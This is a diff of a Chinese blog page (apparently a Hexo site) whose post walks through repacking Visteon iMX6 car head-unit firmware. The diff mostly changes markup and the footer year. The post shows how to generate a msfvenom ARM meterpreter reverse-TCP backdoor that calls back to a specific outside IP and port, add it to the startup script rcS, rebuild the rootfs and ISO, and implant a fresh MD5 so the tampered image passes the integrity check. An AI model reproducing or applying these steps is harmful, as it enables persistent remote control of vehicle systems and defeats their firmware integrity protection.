@@ -35,20 +35,20 @@
 <link rel="canonical" href="https://gorgias.me/2018/11/30/Visteon固件重打包/">
 
 
-<meta name="description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。  升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系统。">
+<meta name="description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。   升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系">
 <meta name="keywords" content="Visteon,ISO,iMX6">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Visteon固件重打包">
 <meta property="og:url" content="https://gorgias.me/2018/11/30/Visteon固件重打包/index.html">
 <meta property="og:site_name" content="Gorgias&#39;Blog">
-<meta property="og:description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。  升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系统。">
+<meta property="og:description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。   升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系">
 <meta property="og:locale" content="en-us">
 <meta property="og:image" content="https://gorgias.me/2018/11/30/Visteon固件重打包/file_tree.png">
 <meta property="og:image" content="https://gorgias.me/2018/11/30/Visteon固件重打包/iso_hex.png">
 <meta property="og:updated_time" content="2018-11-30T14:19:38.084Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Visteon固件重打包">
-<meta name="twitter:description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。  升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系统。">
+<meta name="twitter:description" content="前言 固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。   升级过程 在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系">
 <meta name="twitter:image" content="https://gorgias.me/2018/11/30/Visteon固件重打包/file_tree.png">
 
 
@@ -153,42 +153,41 @@
 
     
             <div class="post-content">
-            <h2>前言</h2>
+            <h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
 <p>固件目录如下，分为三个目录：APP、SOC、MCU。也就是应用、核心板、底板。APP用于升级导航地图和语音识别库数据，MCU目录用于更新MCU固件，包括底板和仪表。SOC目录用于升级核心板系统。version.txt用于验证版本。通过逆向升级程序，发现没有其他签名校验，但是篡改ISO无法升级，于是有了下文。</p>
 <p><img src="file_tree.png" alt="file_tree"></p>
-<h2>升级过程</h2>
+<h2 id="升级过程"><a class="markdownIt-Anchor" href="#升级过程"></a> 升级过程</h2>
 <p>在Viston的iMX6平台，会存在一个“恢复分区”，专门用于升级系统。</p>
 <p>首先修改启动设置，直接访问设备节点，让U-Boot下一次从分区2启动。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /sys/devices/soc0/soc.0/2100000.aips-bus/2198000.usdhc/mmc_host/mmc2/mmc2:0001/boot_config</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /sys/devices/soc0/soc.0/2100000.aips-bus/2198000.usdhc/mmc_host/mmc2/mmc2:0001/boot_config</span><br></pre></td></tr></table></figure>
 <p>启动之后，会格式化并挂载原系统分区。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext3 -F /dev/mmcblk2p2</span><br><span class="line">mount -t ext3 -o rw /dev/mmcblk2p2 /tmp/mmcblk2p12</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext3 -F /dev/mmcblk2p2</span><br><span class="line">mount -t ext3 -o rw /dev/mmcblk2p2 /tmp/mmcblk2p12</span><br></pre></td></tr></table></figure>
 <p>随后挂载ISO镜像</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/mount -t iso9660 -o <span class="built_in">exec</span>,loop /tmp/mnt/8644_8005_3BFD62ABB2EC3783_0/upgrade-ring.iso /tmp/isofs</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/mount -t iso9660 -o <span class="built_in">exec</span>,loop /tmp/mnt/8644_8005_3BFD62ABB2EC3783_0/upgrade-ring.iso /tmp/isofs</span><br></pre></td></tr></table></figure>
 <p>将rootfs解压到目标分区</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvf /tmp/isofs/rootfs.tar -C /tmp/mmcblk2p12</span><br></pre></td></tr></table></figure></p>
-<h2>打包rootfs</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar xvf /tmp/isofs/rootfs.tar -C /tmp/mmcblk2p12</span><br></pre></td></tr></table></figure>
+<h2 id="打包rootfs"><a class="markdownIt-Anchor" href="#打包rootfs"></a> 打包rootfs</h2>
 <p>生成ARMEB平台后门</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=206.189.68.130 LPORT=54444 -f elf -o linux_armle.elf</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: armle from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 260 bytes</span><br><span class="line">Final size of elf file: 344 bytes</span><br><span class="line">Saved as: linux_armle.elf</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=206.189.68.130 LPORT=54444 -f elf -o linux_armle.elf</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: armle from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 260 bytes</span><br><span class="line">Final size of elf file: 344 bytes</span><br><span class="line">Saved as: linux_armle.elf</span><br></pre></td></tr></table></figure>
 <p>添加开机自启动</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/linux_armle.elf &amp;"</span> &gt;&gt; ./etc/init.d/rcS</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/linux_armle.elf &amp;"</span> &gt;&gt; ./etc/init.d/rcS</span><br></pre></td></tr></table></figure>
 <p>注意事项，这里不能保留权限，否则会造成系统无法开启。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf ../rootfs.tar ./*</span><br></pre></td></tr></table></figure></p>
-<h2>ISO-9660</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf ../rootfs.tar ./*</span><br></pre></td></tr></table></figure>
+<h2 id="iso-9660"><a class="markdownIt-Anchor" href="#iso-9660"></a> ISO-9660</h2>
 <p>ISO-9660是CDROM的标准，定义了CDROM的文件结构。Joliet是ISO-9660的扩展，目前有三个等级，Level 1 与DOS兼容，Level 2支持长文件名，但不支持单个大于2GB的文件。Level 3支持单文件大小达到8TB。</p>
-<h2>UDF</h2>
+<h2 id="udf"><a class="markdownIt-Anchor" href="#udf"></a> UDF</h2>
 <p>UDF(Universal Disk Format)统一光盘格式，采用标准的封装写入技术(Packet Writing, PW)，可以将CD-R当做硬盘，支持2GB以上大小文件。兼容性不如ISO 9660</p>
-<h2>ISO MD5</h2>
+<h2 id="iso-md5"><a class="markdownIt-Anchor" href="#iso-md5"></a> ISO MD5</h2>
 <p><img src="iso_hex.png" alt="iso_hex"></p>
-<p>为防止ISO损坏，在ISO文件的头部，有MD5数据，但是用UltraISO打包不会产生这种数据。
+<p>为防止ISO损坏，在ISO文件的头部，有MD5数据，但是用UltraISO打包不会产生这种数据。<br>
 首先查看ISO信息，可以看到使用ISO 9660 Joliet Level 3的标准.</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ isoinfo -d -i upgrade-ring.raw.iso</span><br><span class="line">CD-ROM is <span class="keyword">in</span> ISO 9660 format</span><br><span class="line">System id: LINUX</span><br><span class="line">Volume id: CDROM</span><br><span class="line">Volume <span class="built_in">set</span> id:</span><br><span class="line">Publisher id:</span><br><span class="line">Data preparer id:</span><br><span class="line">Application id: GENISOIMAGE ISO 9660/HFS FILESYSTEM CREATOR (C) 1993 E.YOUNGDALE (C) 1997-2006 J.PEARSON/J.SCHILLING (C) 2006-2007 CDRKIT TEAM</span><br><span class="line">Copyright File id:</span><br><span class="line">Abstract File id:</span><br><span class="line">Bibliographic File id:</span><br><span class="line">Volume <span class="built_in">set</span> size is: 1</span><br><span class="line">Volume <span class="built_in">set</span> sequence number is: 1</span><br><span class="line">Logical block size is: 2048</span><br><span class="line">Volume size is: 488066</span><br><span class="line">Joliet with UCS level 3 found</span><br><span class="line">Rock Ridge signatures version 1 found</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ isoinfo -d -i upgrade-ring.raw.iso</span><br><span class="line">CD-ROM is <span class="keyword">in</span> ISO 9660 format</span><br><span class="line">System id: LINUX</span><br><span class="line">Volume id: CDROM</span><br><span class="line">Volume <span class="built_in">set</span> id:</span><br><span class="line">Publisher id:</span><br><span class="line">Data preparer id:</span><br><span class="line">Application id: GENISOIMAGE ISO 9660/HFS FILESYSTEM CREATOR (C) 1993 E.YOUNGDALE (C) 1997-2006 J.PEARSON/J.SCHILLING (C) 2006-2007 CDRKIT TEAM</span><br><span class="line">Copyright File id:</span><br><span class="line">Abstract File id:</span><br><span class="line">Bibliographic File id:</span><br><span class="line">Volume <span class="built_in">set</span> size is: 1</span><br><span class="line">Volume <span class="built_in">set</span> sequence number is: 1</span><br><span class="line">Logical block size is: 2048</span><br><span class="line">Volume size is: 488066</span><br><span class="line">Joliet with UCS level 3 found</span><br><span class="line">Rock Ridge signatures version 1 found</span><br></pre></td></tr></table></figure>
 <p>首先使用mkisofs打包ISO目录</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkisofs -h</span><br><span class="line">...</span><br><span class="line">-J, -joliet 生成Joliet目录信息</span><br><span class="line">-T, -translation-table 支持长文件名</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mkisofs -J -T -v -o upgrade-ring.iso iso/</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkisofs -h</span><br><span class="line">...</span><br><span class="line">-J, -joliet 生成Joliet目录信息</span><br><span class="line">-T, -translation-table 支持长文件名</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">mkisofs -J -T -v -o upgrade-ring.iso iso/</span><br></pre></td></tr></table></figure>
 <p>打包完ISO之后，使用implantisomd5植入MD5。</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ implantisomd5 upgrade-ring.iso</span><br><span class="line">Inserting md5sum into iso image...</span><br><span class="line">md5 = e1914b1bf902a63244e3bb810823e6b2</span><br><span class="line">Inserting fragment md5sums into iso image...</span><br><span class="line">fragmd5 = 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8</span><br><span class="line">frags = 20</span><br><span class="line">Setting supported flag to 0</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ implantisomd5 upgrade-ring.iso</span><br><span class="line">Inserting md5sum into iso image...</span><br><span class="line">md5 = e1914b1bf902a63244e3bb810823e6b2</span><br><span class="line">Inserting fragment md5sums into iso image...</span><br><span class="line">fragmd5 = 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8</span><br><span class="line">frags = 20</span><br><span class="line">Setting supported flag to 0</span><br></pre></td></tr></table></figure>
 <p>最后校验合法性</p>
-<p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checkisomd5 upgrade-ring.iso</span><br><span class="line">upgrade-ring.raw.iso:   e1914b1bf902a63244e3bb810823e6b2</span><br><span class="line">Fragment sums: 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8</span><br><span class="line">Fragment count: 20</span><br><span class="line">Supported ISO: no</span><br><span class="line">Press [Esc] to abort check.</span><br><span class="line">Checking: 100.0%</span><br><span class="line"></span><br><span class="line">The media check is complete, the result is: PASS.</span><br><span class="line"></span><br><span class="line">It is OK to use this media.</span><br></pre></td></tr></table></figure></p>
-
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ checkisomd5 upgrade-ring.iso</span><br><span class="line">upgrade-ring.raw.iso:   e1914b1bf902a63244e3bb810823e6b2</span><br><span class="line">Fragment sums: 5126d7bcb6459898d56ca8822c5e7bdd45b15d5a9ed6c1f7351a55d18ae8</span><br><span class="line">Fragment count: 20</span><br><span class="line">Supported ISO: no</span><br><span class="line">Press [Esc] to abort check.</span><br><span class="line">Checking: 100.0%</span><br><span class="line"></span><br><span class="line">The media check is complete, the result is: PASS.</span><br><span class="line"></span><br><span class="line">It is OK to use this media.</span><br></pre></td></tr></table></figure>
             </div>
           
 
@@ -255,7 +254,7 @@
     
         2015 -
     
-    2023
+    2024
     <span class="footer-author">Gorgias.  <a href="https://gorgias.me/atom.xml">[RSS]</a></span>
     <span class="power-by">
         Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
